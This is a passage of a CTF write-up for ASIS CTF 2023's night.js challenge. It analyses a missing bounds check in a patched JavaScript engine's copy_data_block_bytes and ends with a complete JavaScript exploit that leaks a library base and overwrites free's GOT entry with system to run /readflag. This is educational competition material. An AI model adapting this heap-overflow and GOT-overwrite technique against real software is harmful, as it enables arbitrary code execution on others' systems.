<p>Now let’s analyze the function below. (<code>copy_data_block_bytes</code>) </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6.2.9.3 CopyDataBlockBytes ( toBlock, toIndex, fromBlock, fromIndex, count ), https://tc39.es/ecma262/#sec-copydatablockbytes</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_data_block_bytes</span><span class="params">(ByteBuffer&amp; to_block, u64 to_index, ByteBuffer <span class="type">const</span>&amp; from_block, u64 from_index, u64 count)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1. Assert: fromBlock and toBlock are distinct values.</span></span><br><span class="line">    VERIFY(&amp;to_block != &amp;from_block);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. Let fromSize be the number of bytes in fromBlock.</span></span><br><span class="line">    <span class="keyword">auto</span> from_size = from_block.size();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. Assert: fromIndex + count ≤ fromSize.</span></span><br><span class="line">    VERIFY(from_index + count &lt;= from_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. Let toSize be the number of bytes in toBlock.</span></span><br><span class="line">    <span class="comment">// auto to_size = to_block.size();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. Assert: toIndex + count ≤ toSize.</span></span><br><span class="line">    <span class="comment">// VERIFY(to_index + count &lt;= to_size);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. Repeat, while count &gt; 0,</span></span><br><span class="line">    <span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// ..</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ii. Set toBlock[toIndex] to fromBlock[fromIndex].</span></span><br><span class="line">        to_block[to_index] = from_block[from_index]; <span class="comment">// here!!!</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// c. Set toIndex to toIndex + 1.</span></span><br><span class="line">        ++to_index;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// d. Set fromIndex to fromIndex + 1.</span></span><br><span class="line">        ++from_index;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// e. Set count to count - 1.</span></span><br><span class="line">        --count;</span><br><span class="line">        <span class="comment">// printf(&quot;\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. Return unused.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>There is no <code>to_index + count &lt;= to_size</code> check. So I can trigger overflow in this line.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ii. Set toBlock[toIndex] to fromBlock[fromIndex].</span></span><br><span class="line">to_block[to_index] = from_block[from_index]; <span class="comment">// here!!!</span></span><br></pre></td></tr></table></figure>

<p>It was natural, since length(size) of <code>to_block</code> is smaller than <code>count</code>. </p>
<p>This is the end of the vulnerabilities I analyzed. Now Let’s go exploit. ^^</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol>
<li><p>libc leak</p>
<ul>
<li>I leaked address of <code>liblagom-js.so.0</code>.</li>
<li>During this process, I conducted various experiments. </li>
<li>I knew the return value of <code>transfer</code> can made type array. So I tried it and then I can did it. (Actually I think I was lucky. ^^)</li>
<li>However, in this process, it was necessary to set values such as view[4], view[5], and view[6]. I relied on dynamic analysis(gdb). </li>
<li><code>view[4]</code>: it means size of victim. when this had too low value, I can’t made type array.</li>
<li><code>view[5]</code>: whether it is an inline buffer. (I didn’t know what this meant when I solved.)</li>
<li><code>view[6]</code>: whether it is detached.</li>
</ul>
</li>
<li><p>GOT overwriting</p>
<ul>
<li>I checked the mapping memory(vmmap instruction in gef debugger) to see if this was possible or not.</li>
<li>When I called <code>transer</code>, I checked the <code>free</code> is called. To be exact, it is called when the old buffer is detached. (<code>detach_array_buffer</code>)</li>
<li>So I decided to overwrite free’s got with a system function!</li>
<li>Actually, I had concerns about how to give an argument to the system.</li>
<li>The answer was to write to an Array Buffer.</li>
<li>In this challenge, I need to execute <code>/readflag</code> instead of <code>sh</code> to read flag.</li>
</ul>
</li>
</ol>
<h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`-<span class="subst">$&#123;hex(-x)&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`0x<span class="subst">$&#123;x.toString(<span class="number">16</span>)&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pwn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x120</span>);</span><br><span class="line">    view = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buffer);</span><br><span class="line">     </span><br><span class="line">    view[<span class="number">4</span>] = <span class="number">0x500n</span>; <span class="comment">// size</span></span><br><span class="line">    view[<span class="number">5</span>] = <span class="number">1n</span>;     <span class="comment">// from_block = (__int64 *)*a3;</span></span><br><span class="line">    view[<span class="number">6</span>] = <span class="number">1n</span>;     <span class="comment">// is_detached</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> buffer2 = buffer.<span class="title function_">transfer</span>(<span class="number">0x20</span>); </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(buffer2.<span class="property">byteLength</span>);</span><br><span class="line">    <span class="keyword">var</span> victim = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buffer2);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        leak</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    liblagom_js_base = victim[<span class="number">8</span>] - <span class="number">0x67dda8n</span>; <span class="comment">// liblagom-js.so.0</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;liblagom_js_base: &quot;</span> + <span class="title function_">hex</span>(liblagom_js_base));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Exploit setup</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x120</span>);</span><br><span class="line">    hax = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line">    free_got = liblagom_js_base + <span class="number">0x69b420n</span>;</span><br><span class="line">    system = liblagom_js_base - <span class="number">0x5c4dd0n</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;free_got: &quot;</span>+ <span class="title function_">hex</span>(free_got));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;system: &quot;</span>+ <span class="title function_">hex</span>(system));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x120</span>);</span><br><span class="line">    v = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(b);</span><br><span class="line">    </span><br><span class="line">    v[<span class="number">0</span>] = <span class="number">0x616c66646165722fn</span>; </span><br><span class="line">    v[<span class="number">1</span>] = <span class="number">0x0000000000000067n</span>;</span><br><span class="line">    </span><br><span class="line">    v[<span class="number">4</span>] = <span class="number">0x500n</span>; <span class="comment">// size</span></span><br><span class="line">    v[<span class="number">5</span>] = <span class="number">1n</span>;     <span class="comment">// from_block = (__int64 *)*a3;</span></span><br><span class="line">    v[<span class="number">6</span>] = <span class="number">1n</span>;     <span class="comment">// is_detached</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// got overwriting</span></span><br><span class="line">    victim[<span class="number">64</span>] = free_got; </span><br><span class="line">    hax[<span class="number">0</span>] = system;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Exploit</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    b.<span class="title function_">transfer</span>(<span class="number">0x20</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">pwn</span>();</span><br></pre></td></tr></table></figure>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#chall-txt"><span class="toc-number">1.1.</span> <span class="toc-text">chall.txt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chall-patch"><span class="toc-number">1.2.</span> <span class="toc-text">chall.patch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analysis-1"><span class="toc-number">1.3.</span> <span class="toc-text">Analysis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Scenario"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Scenario</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230930-asisctf2023-nightjs/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&text=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&title=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&is_video=false&description=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ASIS CTF 2023 - night.js (JavaScript Engine)&body=Check out this article: https://jiravvit.github.io/230930-asisctf2023-nightjs/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&title=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&title=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&title=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&title=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230930-asisctf2023-nightjs/&name=ASIS CTF 2023 - night.js (JavaScript Engine)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230930-asisctf2023-nightjs/&t=ASIS CTF 2023 - night.js (JavaScript Engine)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2023
    jir4vvit
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'jiravvit-github-io';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
